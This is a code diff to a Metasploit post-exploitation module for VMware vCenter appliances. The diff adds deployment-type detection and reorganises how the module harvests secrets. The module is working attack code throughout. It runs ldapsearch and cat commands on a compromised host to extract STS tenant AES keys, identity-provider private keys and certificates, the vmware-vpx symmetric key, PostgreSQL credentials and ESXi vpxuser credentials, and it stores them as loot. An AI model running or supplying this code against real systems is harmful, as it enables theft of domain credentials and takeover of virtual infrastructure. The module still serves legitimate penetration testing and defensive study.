@@ -64,18 +64,21 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    get_vcsa_version
     validate_target
 
     print_status('Gathering vSphere SSO domain information ...')
     vmdir_init
 
-    print_status('Extracting PostgreSQL database credentials ...')
-    get_db_creds
+    if @vc_type_embedded || @vc_type_management
+      print_status('Extracting PostgreSQL database credentials ...')
+      get_db_creds
 
-    print_status('Extract ESXi host vpxuser credentials ...')
-    enum_vpxuser_creds
+      print_status('Extract ESXi host vpxuser credentials ...')
+      enum_vpxuser_creds
+    end
 
-    if datastore['DUMP_VMDIR']
+    if datastore['DUMP_VMDIR'] && (@vc_type_embedded || @vc_type_infrastructure)
       print_status('Extracting vSphere SSO domain secrets ...')
       vmdir_dump
     end
@@ -83,7 +86,7 @@ class MetasploitModule < Msf::Post
     if datastore['DUMP_VMAFD']
       print_status('Extracting certificates from vSphere platform ...')
       vmafd_dump
-      if datastore['DUMP_SPEC']
+      if datastore['DUMP_SPEC'] && (@vc_type_embedded || @vc_type_management)
         print_status('Searching for secrets in VM Guest Customization Specification XML ...')
         enum_vm_cust_spec
       end
@@ -189,8 +192,11 @@ class MetasploitModule < Msf::Post
   end
 
   def vmafd_dump
-    get_vmca_cert
-    get_idp_cert
+    if @vc_type_embedded || @vc_type_infrastructure
+      get_vmca_cert
+      get_idp_cert
+    end
+
     shell_cmd = '/usr/lib/vmware-vmafd/bin/vecs-cli store list'
     vecs_stores = cmd_exec(shell_cmd).split("\n")
     unless vecs_stores.first
@@ -230,8 +236,6 @@ class MetasploitModule < Msf::Post
   end
 
   def get_vmca_cert
-    return unless @embedded_psc
-
     vprint_status('Extract VMCA_ROOT key ...')
 
     unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
@@ -336,7 +340,7 @@ class MetasploitModule < Msf::Post
       # On vCenter 7.x instances the tenant AES key was always Base64 encoded vs. plaintext, and vmwSTSPassword was missing from the LDIF dump.
       # It appears that vCenter 7.x does not return vmwSTSPassword even with appropriate LDAP flags - this is not like prior versions.
       # The data can still be extracted directly with ldapsearch syntax below which works in all versions, but is a PITA.
-      shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@ldap_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"
+      shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@vc_psc_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(&(objectClass=vmwSTSIdentityStore)(vmwSTSConnectionStrings=#{sso_conn_str}))\" \"vmwSTSPassword\" | awk -F 'vmwSTSPassword: ' '{print $2}'"
 
       vmdir_user_sso_pass = cmd_exec(shell_cmd).split("\n").last
       sso_pass = tenant_aes_decrypt(vmdir_user_sso_pass)
@@ -367,11 +371,11 @@ class MetasploitModule < Msf::Post
   end
 
   def get_aes_keys
-    if @embedded_psc
+    if @vc_type_embedded || @vc_type_infrastructure
       # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
       print_status('Extract vmdird tenant AES encryption key ...')
 
-      shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@ldap_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
+      shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@vc_psc_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey"
       tenant_key = cmd_exec(shell_cmd).split("\n").last
       vprint_status("Result returned for vmwSTSTenantKey query was '#{tenant_key}'")
 
@@ -415,28 +419,30 @@ class MetasploitModule < Msf::Post
       store_valid_credential(user: 'STS AES key', private: tenant_aes_key, service_data: extra_service_data)
     end
 
-    print_status('Extract vmware-vpx AES key ...')
-    unless file_exist?('/etc/vmware-vpx/ssl/symkey.dat')
-      fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate /etc/vmware-vpx/ssl/symkey.dat')
+    if @vc_type_embedded || @vc_type_management
+      print_status('Extract vmware-vpx AES key ...')
+      unless file_exist?('/etc/vmware-vpx/ssl/symkey.dat')
+        fail_with(Msf::Exploit::Failure::Unknown, 'Could not locate /etc/vmware-vpx/ssl/symkey.dat')
+      end
+
+      sym_key = cmd_exec('cat /etc/vmware-vpx/ssl/symkey.dat')
+      @vc_sym_key = sym_key.scan(/../).map(&:hex).pack('C*')
+      print_good("vSphere vmware-vpx AES encryption\n\tHEX: #{sym_key}")
+
+      extra_service_data = {
+        address: Rex::Socket.getaddress(rhost),
+        port: 5432,
+        service_name: 'psql',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+        realm_value: @base_fqdn
+      }
+
+      store_valid_credential(user: 'VPX AES key', private: sym_key, service_data: extra_service_data)
     end
-
-    sym_key = cmd_exec('cat /etc/vmware-vpx/ssl/symkey.dat')
-    @vc_sym_key = sym_key.scan(/../).map(&:hex).pack('C*')
-    print_good("vSphere vmware-vpx AES encryption\n\tHEX: #{sym_key}")
-
-    extra_service_data = {
-      address: Rex::Socket.getaddress(rhost),
-      port: 5432,
-      service_name: 'psql',
-      protocol: 'tcp',
-      workspace_id: myworkspace_id,
-      module_fullname: fullname,
-      origin_type: :service,
-      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
-      realm_value: @base_fqdn
-    }
-
-    store_valid_credential(user: 'VPX AES key', private: sym_key, service_data: extra_service_data)
   end
 
   def tenant_aes_decrypt(b64)
@@ -470,11 +476,9 @@ class MetasploitModule < Msf::Post
   end
 
   def get_idp_cert
-    return unless @embedded_psc
-
     vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')
 
-    shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@ldap_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
+    shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@vc_psc_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey | awk '/vmwSTSPrivateKey/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/vmwSTSPrivateKey::/\\n/g'"
 
     idp_keys = []
     idp_certs = []
@@ -489,7 +493,7 @@ class MetasploitModule < Msf::Post
           fail_with(Msf::Exploit::Failure::Unknown, 'Error processing IdP trusted certificate private key')
         end
         idp_keys << privkey
-        shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@ldap_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
+        shell_cmd = "/opt/likewise/bin/ldapsearch -h #{@vc_psc_fqdn} -LLL -p 389 -b \"cn=#{@base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{@base_dn}\" -D \"#{@bind_dn}\" -w #{@shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" userCertificate | awk '/userCertificate/,0'| sed -r 's/\\s+//g' | tr -d \"\\n\" | sed 's/userCertificate::/\\n/g'"
         idp_chain = cmd_exec(shell_cmd).strip!
         certcol = "#{idp_chain}\n"
         certcol.each_line do |certline|
@@ -579,11 +583,6 @@ class MetasploitModule < Msf::Post
 
       xmldoc = Nokogiri::XML(xml) do |config|
         config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
-      end
-
-      unless xmldoc
-        print_error("Could not parse XML document from PSQL query output for VM Guest Customization Template '#{spec}'")
-        next
       end
 
       unless (enc_cert_len = xmldoc.at_xpath('/ConfigRoot/encryptionKey/_length').text.to_i)
@@ -840,8 +839,19 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_target
-    unless command_exists?('/usr/sbin/vpxd')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/sbin/vpxd (is this host a vCenter appliance?)')
+    if @vc_type_embedded || @vc_type_management
+      unless file_exist?('/etc/vmware/db.type')
+        fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /etc/vmware/db.type')
+      end
+
+      vc_db_type = cmd_exec('cat /etc/vmware/db.type').downcase
+      unless vc_db_type == 'embedded'
+        fail_with(Msf::Exploit::Failure::BadConfig, "This module only supports embedded PostgreSQL, appliance reports DB type '#{vc_db_type}'")
+      end
+
+      unless command_exists?('/opt/vmware/vpostgres/current/bin/psql')
+        fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/vmware/vpostgres/current/bin/psql')
+      end
     end
 
     unless command_exists?('/opt/vmware/share/vami/vami_hname') && command_exists?('/opt/vmware/share/vami/vami_domain')
@@ -864,10 +874,6 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/likewise/bin/ldapsearch')
     end
 
-    unless command_exists?('/opt/vmware/vpostgres/current/bin/psql')
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/vmware/vpostgres/current/bin/psql')
-    end
-
     vsphere_machine_hostname = cmd_exec('/opt/vmware/share/vami/vami_hname')
     vsphere_machine_domainname = cmd_exec('/opt/vmware/share/vami/vami_domain')
 
@@ -881,26 +887,71 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vCenter eth0 IPv4')
     end
 
-    print_status("vSphere Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")
-    @vcsa_build = cmd_exec('/usr/sbin/vpxd -v').split("\n").last
-    print_status(@vcsa_build)
+    print_status("Appliance Hostname and IPv4: #{@vcenter_fqdn} [#{vsphere_machine_ipv4}]")
     get_psc
   end
 
+  def get_vcsa_version
+    unless file_exist?('/opt/vmware/etc/appliance-manifest.xml')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /opt/vmware/etc/appliance-manifest.xml (is this a vCenter appliance?)')
+    end
+
+    xml = cmd_exec('cat /opt/vmware/etc/appliance-manifest.xml').to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
+
+    xmldoc = Nokogiri::XML(xml) do |config|
+      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
+    end
+
+    vc_product_banner = xmldoc.at_xpath('/update/product').text
+    vc_product_build = xmldoc.at_xpath('/update/fullVersion').text
+
+    unless file_exist?('/etc/vmware/deployment.node.type')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /etc/vmware/deployment.node.type')
+    end
+
+    vcsa_type = cmd_exec('cat /etc/vmware/deployment.node.type').split("\n").first.downcase
+    case vcsa_type
+    when 'embedded' # Integrated vCenter and PSC
+      @vc_deployment_type = 'vCenter Appliance (Embedded)'
+      @vc_type_embedded = true
+      @vc_type_infrastructure = false
+      @vc_type_management = false
+    when 'infrastructure' # PSC only
+      @vc_deployment_type = 'vCenter Platform Service Controller'
+      @vc_type_embedded = false
+      @vc_type_infrastructure = true
+      @vc_type_management = false
+    when 'management' # vCenter only
+      @vc_deployment_type = 'vCenter Appliance (Management)'
+      @vc_type_embedded = false
+      @vc_type_infrastructure = false
+      @vc_type_management = true
+    else
+      fail_with(Msf::Exploit::Failure::Unknown, "Unable to determine appliance deployment type returned from server: #{vcsa_type}")
+    end
+
+    if @vc_type_embedded || @vc_type_management
+      unless command_exists?('/usr/sbin/vpxd')
+        fail_with(Msf::Exploit::Failure::BadConfig, 'Could not find /usr/sbin/vpxd')
+      end
+      @vcsa_build = cmd_exec('/usr/sbin/vpxd -v').split("\n").last
+    else
+      @vcsa_build = "#{vc_product_banner} #{vc_product_build}"
+    end
+
+    print_status(@vcsa_build)
+    print_status(@vc_deployment_type)
+  end
+
   def get_psc
-    lookup_service = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-ls-location --server-name localhost')
-    lookup_uri = URI.parse(lookup_service)
-    ls_host = lookup_uri.host.downcase
-    case @vcenter_fqdn == ls_host
-    when true
-      @ldap_fqdn = 'localhost'
-      @embedded_psc = true
-      print_status('Embedded Platform Service Controller')
-    when false
-      @ldap_fqdn = ls_host
-      @embedded_psc = false
-      print_warning("External Platform Service Controller: #{@ldap_fqdn}")
-      print_warning('This module assumes embedded PSC, functionality will be limited')
+    if @vc_type_management
+      lookup_service = cmd_exec('/usr/lib/vmware-vmafd/bin/vmafd-cli get-ls-location --server-name localhost')
+      lookup_uri = URI.parse(lookup_service)
+      ls_host = lookup_uri.host.downcase
+      @vc_psc_fqdn = ls_host
+      print_warning("External Platform Service Controller Detected: #{@vc_psc_fqdn}")
+    else
+      @vc_psc_fqdn = 'localhost'
     end
   end
 
